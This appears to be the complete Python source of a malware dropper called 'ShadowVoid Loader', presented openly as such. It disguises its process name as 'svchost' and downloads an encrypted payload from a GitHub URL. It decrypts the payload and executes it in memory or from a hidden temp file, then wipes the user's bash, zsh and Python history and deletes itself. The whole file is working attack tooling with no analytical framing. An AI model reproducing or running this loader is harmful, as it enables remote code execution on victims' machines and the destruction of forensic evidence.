#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowVoid Loader v1.0.0-alpha
Innocuous dropper - downloads and executes encrypted payload
Zero footprint, self-destructing
Memory-only execution mode
"""

import sys
import os
import base64
import zlib
import hashlib
import subprocess
import platform
import urllib.request
import tempfile
import ctypes
from types import ModuleType

try:
    if platform.system() == 'Linux':
        libc = ctypes.CDLL(None)
        libc.prctl(15, b'svchost', 0, 0, 0)
    if hasattr(sys, 'argv'):
        sys.argv[0] = 'svchost'
except:
    pass

CONFIG = {
    'payload_url': 'https://raw.githubusercontent.com/mraaisa-afk/shadow-void/main/core_encrypted.bin',
    'temp_dir': tempfile.gettempdir(),
    'self_destruct': True,
    'memory_only': True
}


def scrub_tracks():
    try:
        history_files = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            os.path.expanduser('~/.python_history')
        ]
        for hf in history_files:
            if os.path.exists(hf):
                try:
                    with open(hf, 'w') as f:
                        f.write('\x00' * 10000)
                    open(hf, 'w').close()
                except:
                    pass
        if CONFIG['self_destruct']:
            try:
                os.unlink(__file__)
            except:
                pass
    except:
        pass


def download_payload(url):
    try:
        req = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        )
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.read()
    except Exception as e:
        print(f"Download failed: {e}")
        scrub_tracks()
        sys.exit(1)


def decrypt_payload(encrypted_data, key):
    try:
        from Crypto.Cipher import AES
        nonce = encrypted_data[:12]
        tag = encrypted_data[12:28]
        ciphertext = encrypted_data[28:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except:
        return bytes([encrypted_data[i] ^ key[i % len(key)] for i in range(len(encrypted_data))])


def get_key():
    return b'\x00' * 32


def execute_in_memory(code_string, globals_dict=None):
    """Execute Python code directly from memory without touching disk"""
    try:
        if globals_dict is None:
            globals_dict = {}
        exec(compile(code_string, '<memory>', 'exec'), globals_dict)
        return True
    except Exception as e:
        return False


def execute_payload_memory(payload):
    """Execute payload directly from memory"""
    try:
        payload_str = payload.decode('utf-8')
        return execute_in_memory(payload_str)
    except:
        return False


def execute_payload(payload):
    """Execute payload with memory-first approach"""
    try:
        if CONFIG.get('memory_only', True):
            if execute_payload_memory(payload):
                return True
        # Fallback to temp file
        temp_file = os.path.join(CONFIG['temp_dir'], '.sv_temp')
        with open(temp_file, 'wb') as f:
            f.write(payload)
        os.chmod(temp_file, 0o700)
        subprocess.Popen([sys.executable, temp_file])
        try:
            os.unlink(temp_file)
        except:
            pass
        return True
    except Exception as e:
        return False


def main():
    try:
        encrypted = download_payload(CONFIG['payload_url'])
        key = get_key()
        payload = decrypt_payload(encrypted, key)
        execute_payload(payload)
    except Exception as e:
        print(f"Loader failed: {e}")
    finally:
        scrub_tracks()


if __name__ == '__main__':
    main()

